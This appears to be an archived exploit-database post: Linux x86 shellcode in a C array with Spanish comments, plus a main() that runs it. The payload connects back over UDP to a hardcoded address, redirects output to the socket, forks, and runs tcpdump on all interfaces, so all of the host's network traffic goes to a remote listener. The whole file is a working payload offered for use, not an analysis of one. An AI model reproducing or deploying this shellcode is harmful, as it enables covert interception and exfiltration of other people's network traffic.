/*
 linux/x86 connect-back port UDP/54321 & dup2 &
 fork() & execve() /usr/bin/tcpdump -iany -w- "port ! 54321"
 151 bytes
 by XenoMuta
     _  __                 __  ___      __
    | |/ /__  ____  ____  /  |/  /_  __/ /_____ _
    |   / _ \/ __ \/ __ \/ /|_/ / / / / __/ __ `/
   /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ /
  /_/|_\___/_/ /_/\____/_/  /_/\__,_/\__/\__,_/

   xenomuta [ arroba ] phreaker [ punto ] net

  http://xenomuta.tuxfamily.org/ - Methylxantina 256mg

 - God bless you all -

*/
unsigned char sc[] =
// <_start>:
"\x6a\x66"	 // push   $0x66 ; socketcall()
"\x58"		 // pop    %eax  ; para setear el socket
"\x6a\x01"	 // push   $0x1
"\x5b"		 // pop    %ebx
"\x31\xc9"	 // xor    %ecx,%ecx
"\x51"		 // push   %ecx
"\x6a\x02"	 // push   $0x2  ; SOCK_DGRAM (udp)
"\x6a\x02"	 // push   $0x2
"\x89\xe1"	 // mov    %esp,%ecx
"\xcd\x80"	 // int    $0x80
// IP: 127.1.1.1
"\x68\x7f\x01\x01\x01"	 // push   $0x101017f
// Port: 54321
"\x66\x68\xd4\x31"	 // pushw  $0x31d4
"\x66\x31\xc9"	 // xor    %cx,%cx
"\x80\xc1\x02"	 // xadd    $0x2,%cl
"\x66\x51"	 // push   %cx
"\x89\xe1"	 // mov    %esp,%ecx
"\x6a\x10"	 // push   $0x10
"\x51"		 // push   %ecx
"\x50"		 // push   %eax
"\x89\xe1"	 // mov    %esp,%ecx
"\x89\xc6"	 // mov    %eax,%esi
"\xb0\x66"	 // mov    $0x66,%al  ; socketcall ()
"\x80\xc3\x02"	 // add    $0x2,%bl   ; para connect()
"\xcd\x80"	 // int    $0x80
"\x87\xde"	 // xchg   %ebx,%esi
"\x6a\x01"	 // push   $0x1
"\x59"		 // pop    %ecx
"\x6a\x3f"	 // push   $0x3f      ; dup2(socket, stdout)
"\x58"		 // pop    %eax
"\xcd\x80"	 // int    $0x80
"\x31\xd2"	 // xor    %edx,%edx
"\x6a\x02"	 // push   $0x2       ; fork()
"\x58"		 // pop    %eax
"\xcd\x80"	 // int    $0x80
"\x39\xd0"	 // cmp    %edx,%eax  ; el hijo sobrevive
"\x74\x05"	 // je     0x4d <_child>
"\x6a\x01"	 // push   $0x1       ; adios papa
"\x58"		 // pop    %eax
"\xcd\x80"	 // int    $0x80
//<_child>:
"\x6a\x0b"	 // push   $0xb    ; execve() tcpdump -iany -w- "port ! 54321"
"\x58"		 // pop    %eax    ; sniffea todo menos a mi mismo.
"\x52"		 // push   %edx
"\x68\x34\x33\x32\x31"	 // push   $0x31323334 ; "port ! 54321"
"\x68\x20\x21\x20\x35"	 // push   $0x35202120
"\x68\x70\x6f\x72\x74"	 // push   $0x74726f70
"\x89\xe7"	 // mov    %esp,%edi
"\x52"		 // push   %edx
"\x6a\x2d"	 // push   $0x2d               ; -w- ( escribe a stdout )
"\x66\x68\x2d\x77"	 // pushw  $0x772d
"\x89\xe6"	 // mov    %esp,%esi
"\x52"		 // push   %edx
"\x6a\x79"	 // push   $0x79               ; -iany (todas las interfaces )
"\x68\x2d\x69\x61\x6e"	 // push   $0x6e61692d
"\x89\xe1"	 // mov    %esp,%ecx
"\x52"		 // push   %edx
"\x6a\x70"	 // push   $0x70
"\x68\x70\x64\x75\x6d"	 // push   $0x6d756470 ; /usr/bin/tcpdump
"\x68\x6e\x2f\x74\x63"	 // push   $0x63742f6e
"\x68\x2f\x73\x62\x69"	 // push   $0x6962732f
"\x68\x2f\x75\x73\x72"	 // push   $0x7273752f
"\x89\xe3"	 // mov    %esp,%ebx
"\x52"		 // push   %edx
"\x57"		 // push   %edi
"\x56"		 // push   %esi
"\x51"		 // push   %ecx
"\x53"		 // push   %ebx
"\x89\xe1"	 // mov    %esp,%ecx
"\xcd\x80";	 // int    $0x80


main(){(*(void (*)()) sc)();}

// milw0rm.com [2008-11-23]